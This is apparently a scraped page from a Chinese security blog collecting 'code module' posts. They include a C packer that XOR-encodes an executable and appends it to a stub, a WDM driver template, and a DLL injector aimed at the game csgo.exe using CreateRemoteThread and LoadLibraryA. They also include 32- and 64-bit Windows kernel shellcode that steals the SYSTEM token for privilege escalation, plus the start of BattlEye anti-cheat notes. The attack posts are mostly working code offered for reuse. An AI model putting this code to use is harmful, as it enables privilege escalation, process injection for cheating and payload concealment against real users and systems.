+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	</span><br><span class="line">	WCHAR AbsolutePathA[MAX_PATH];</span><br><span class="line">	WCHAR AbsolutePathB[MAX_PATH];</span><br><span class="line">	WCHAR OutputFile[MAX_PATH];</span><br><span class="line">	ZeroMemory(AbsolutePathA, MAX_PATH);</span><br><span class="line">	ZeroMemory(AbsolutePathB, MAX_PATH);</span><br><span class="line">	ZeroMemory(OutputFile, MAX_PATH);</span><br><span class="line">	GetCurrentDirectory(MAX_PATH, AbsolutePathA);</span><br><span class="line">	GetCurrentDirectory(MAX_PATH, AbsolutePathB);</span><br><span class="line">	WCHAR *ProgramB = argv[<span class="number">1</span>];</span><br><span class="line">	WCHAR ProgramA[MAX_PATH] = <span class="string">L&quot;\\SelectMyParent.exe&quot;</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(AbsolutePathA + lstrlenW(AbsolutePathA), ProgramA, lstrlenW(ProgramA)*<span class="number">2</span>);</span><br><span class="line">	AbsolutePathB[lstrlenW(AbsolutePathB)] = <span class="string">&#x27;\\&#x27;</span>;</span><br><span class="line">	<span class="built_in">memcpy</span>(AbsolutePathB + lstrlenW(AbsolutePathB), ProgramB, lstrlenW(ProgramB)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(OutputFile, AbsolutePathB, lstrlenW(AbsolutePathB)*<span class="number">2</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(OutputFile + lstrlenW(AbsolutePathB) - <span class="number">4</span>, <span class="string">L&quot;_protected.exe&quot;</span>, lstrlenW(<span class="string">L&quot;_protected.exe&quot;</span>) * <span class="number">2</span>);</span><br><span class="line">	wprintf(<span class="string">L&quot;%s\r\n&quot;</span>, OutputFile);</span><br><span class="line"></span><br><span class="line">	HANDLE hAbsolutePathA = CreateFile(AbsolutePathA, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == hAbsolutePathA)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;Open hAbsolutePathA Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HANDLE hAbsolutePathB = CreateFile(AbsolutePathB, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (INVALID_HANDLE_VALUE == hAbsolutePathB)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;Open hAbsolutePathB Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HANDLE hOutputFile = CreateFile(OutputFile, GENERIC_ALL, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span>(INVALID_HANDLE_VALUE == hOutputFile)</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;Create OutputFile Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD ASize = GetFileSize(hAbsolutePathA, <span class="literal">NULL</span>);</span><br><span class="line">	DWORD BSize = GetFileSize(hAbsolutePathB, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	PBYTE AFileBuff = (PBYTE)<span class="built_in">malloc</span>(ASize);</span><br><span class="line">	PBYTE BFileBuff = (PBYTE)<span class="built_in">malloc</span>(BSize);</span><br><span class="line"></span><br><span class="line">	DWORD readSizeA = <span class="number">0</span>, readSizeB = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!ReadFile(hAbsolutePathA, AFileBuff, ASize, &amp;readSizeA, <span class="literal">NULL</span>)) </span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;ReadFile A Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!ReadFile(hAbsolutePathB, BFileBuff, BSize, &amp;readSizeB, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;ReadFile B Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD OutputFileSize = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(!WriteFile(hOutputFile, AFileBuff,readSizeA,&amp;OutputFileSize,<span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;WriteFile A Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; readSizeB; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		BFileBuff[i] ^= <span class="number">0xCC</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!WriteFile(hOutputFile, BFileBuff, readSizeB, &amp;OutputFileSize, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;WriteFile B Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!WriteFile(hOutputFile, &amp;ASize, <span class="number">4</span>, &amp;OutputFileSize, <span class="literal">NULL</span>)) </span><br><span class="line">	&#123;</span><br><span class="line">		wprintf(<span class="string">L&quot;WriteFile A Length Error : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	CloseHandle(hAbsolutePathA);</span><br><span class="line">	CloseHandle(hAbsolutePathB);</span><br><span class="line">	CloseHandle(hOutputFile);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/02/driverStart/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/02/driverStart/" class="post-title-link" itemprop="url">代码模块 | 驱动模版</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-07-02 09:43:26 / Modified: 09:49:02" itemprop="dateCreated datePublished" datetime="2021-07-02T09:43:26+08:00">2021-07-02</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>WDM驱动模版</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DrivUnload</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;--------Driver Unload -------------------\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//DbgBreakPoint();</span></span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DrivUnload;</span><br><span class="line"></span><br><span class="line">	DbgPrint(<span class="string">&quot;--------Driver Loaded : %wZ--------------\r\n&quot;</span>,pReg);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>工程项目中有几个地方需要修改：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c/c++ --&gt; 常规 --&gt; 将警告视为错误 改为否</span><br><span class="line">c/c++ --&gt; 代码生成 --&gt; Spectre Mitigation 设为Disabled</span><br><span class="line">删除inf文件</span><br></pre></td></tr></table></figure>
+<p>即可顺利编译</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/01/FindPidwithName/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/01/FindPidwithName/" class="post-title-link" itemprop="url">代码模块 | 获取PID方法</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-07-01 13:30:32" itemprop="dateCreated datePublished" datetime="2021-07-01T13:30:32+08:00">2021-07-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-07-02 09:50:30" itemprop="dateModified" datetime="2021-07-02T09:50:30+08:00">2021-07-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>下列代码是标准的一段通过进程名获取PID的方法</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//样例代码为单字节项目，宽字节下可用 wchar_t 与 wcsicmp</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcId</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* procName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD procId = <span class="number">0</span>;</span><br><span class="line">    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hSnap != INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        PROCESSENTRY32 procEntry;</span><br><span class="line">        procEntry.dwSize = <span class="keyword">sizeof</span>(procEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Process32First(hSnap, &amp;procEntry))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!_stricmp(procEntry.szExeFile, procName))</span><br><span class="line">                &#123;</span><br><span class="line">                    procId = procEntry.th32ProcessID;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (Process32Next(hSnap, &amp;procEntry));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    CloseHandle(hSnap);</span><br><span class="line">    <span class="keyword">return</span> procId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* dllPath = <span class="string">&quot;C:\\Users\\me\\Desktop\\dll.dll&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* procName = <span class="string">&quot;csgo.exe&quot;</span>;</span><br><span class="line">    DWORD procId = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!procId)</span><br><span class="line">    &#123;</span><br><span class="line">        procId = GetProcId(procName);</span><br><span class="line">        Sleep(<span class="number">30</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, procId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hProc &amp;&amp; hProc != INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">void</span>* loc = VirtualAllocEx(hProc, <span class="number">0</span>, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">        WriteProcessMemory(hProc, loc, dllPath, <span class="built_in">strlen</span>(dllPath) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        HANDLE hThread = CreateRemoteThread(hProc, <span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hThread)</span><br><span class="line">        &#123;</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hProc)</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hProc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/30/shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/06/30/shellcode/" class="post-title-link" itemprop="url">代码模块 | 内核提权shellcode</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-06-30 15:39:02" itemprop="dateCreated datePublished" datetime="2021-06-30T15:39:02+08:00">2021-06-30</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-07-02 09:48:27" itemprop="dateModified" datetime="2021-07-02T09:48:27+08:00">2021-07-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>32位下提权shellcode</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellCode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _asm</span><br><span class="line">    &#123;</span><br><span class="line">        pushad</span><br><span class="line">        mov eax,fs:[<span class="number">124</span>h]        <span class="comment">// 找到当前线程的_KTHREAD结构</span></span><br><span class="line">        mov eax, [eax + <span class="number">0x50</span>]    <span class="comment">// 找到_EPROCESS结构</span></span><br><span class="line">        mov ecx, eax</span><br><span class="line">        mov edx, <span class="number">4</span>    <span class="comment">// edx = system PID(4)</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 循环是为了获取system的_EPROCESS</span></span><br><span class="line">    find_sys_pid:</span><br><span class="line">        mov eax, [eax + <span class="number">0xb8</span>]    <span class="comment">// 找到进程活动链表</span></span><br><span class="line">        sub eax, <span class="number">0xb8</span>            <span class="comment">// 链表遍历</span></span><br><span class="line">        cmp [eax + <span class="number">0xb4</span>], edx    <span class="comment">// 根据PID判断是否为SYSTEM</span></span><br><span class="line">        jnz find_sys_pid</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 替换Token</span></span><br><span class="line">        mov edx, [eax + <span class="number">0xf8</span>]</span><br><span class="line">        mov [ecx + <span class="number">0xf8</span>], edx</span><br><span class="line">        popad</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>64位下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">shellCode proc</span><br><span class="line">; shellcode编写</span><br><span class="line">mov rax, gs:[188h]    ;Kprcb.Kpthread</span><br><span class="line">mov rax, [rax+220h]    ;process</span><br><span class="line">mov    rcx, rax    ; keep copy value</span><br><span class="line">mov    rdx, 4        ; system PID</span><br><span class="line"> </span><br><span class="line">findSystemPid:</span><br><span class="line">    mov    rax, [rax+2e8h]    ; ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line">    sub    rax, 2e8h</span><br><span class="line">    cmp    [rax+2e0h], rdx</span><br><span class="line">    jnz findSystemPid</span><br><span class="line"> </span><br><span class="line">    ; 替换Token</span><br><span class="line">    mov rdx, [rax+348h]    ; get system token</span><br><span class="line">    mov [rcx+348h], rdx    ; copy</span><br><span class="line">    ret</span><br><span class="line"> </span><br><span class="line">shellCode endp</span><br></pre></td></tr></table></figure>
+
+<p>在windows内核中主要提权手段如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] ShellCode目的: 进行提权</span><br><span class="line">[+] 提权手段: 将system进程的Token赋值给cmd</span><br><span class="line">[+] 提权的汇编步骤:</span><br><span class="line">==&gt; 找到system的Token, 记作TokenSys</span><br><span class="line">==&gt; 找到cmd的Token. 记作TokenCmd</span><br><span class="line">==&gt; 实现TokenCmd = TokenSys</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>结束、学废了么！！！</p>
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/01/25/battleye2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/01/25/battleye2/" class="post-title-link" itemprop="url">游戏安全 | ByttleEye 学习笔记</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-25 15:39:02" itemprop="dateCreated datePublished" datetime="2021-01-25T15:39:02+08:00">2021-01-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-07-02 09:50:28" itemprop="dateModified" datetime="2021-07-02T09:50:28+08:00">2021-07-02</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>使用BE的游戏有：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Fortnite</span><br><span class="line">PUBG</span><br><span class="line">Escape from Tarkov</span><br><span class="line">Rainbow Six Siege</span><br><span class="line">Ark Survival Evolved</span><br><span class="line">ARMA II</span><br><span class="line">ARMA III</span><br><span class="line">DAYZ</span><br><span class="line">H1Z1</span><br><span class="line">Surivial Of the Fittest</span><br><span class="line">PlanetSide 2</span><br><span class="line">Survarium</span><br><span class="line">Project Argo</span><br><span class="line">Unturned</span><br><span class="line">Insurgency</span><br><span class="line">Day of Infamy</span><br><span class="line">The Isle</span><br><span class="line">Line of Sight</span><br><span class="line">Conan Exiles</span><br><span class="line">Tibia</span><br><span class="line">Black Squad</span><br><span class="line">S4League</span><br><span class="line">Zula</span><br><span class="line">Islands of Nyne</span><br><span class="line">BlackLight Retribution</span><br><span class="line">SOS</span><br><span class="line">Pixark</span><br><span class="line">Heroes &amp; Generals</span><br><span class="line">Bless Online</span><br><span class="line">and more</span><br></pre></td></tr></table></figure>
+
+<p>BE是一款内核级反作弊软件</p>
+<p>BE组件有：</p>
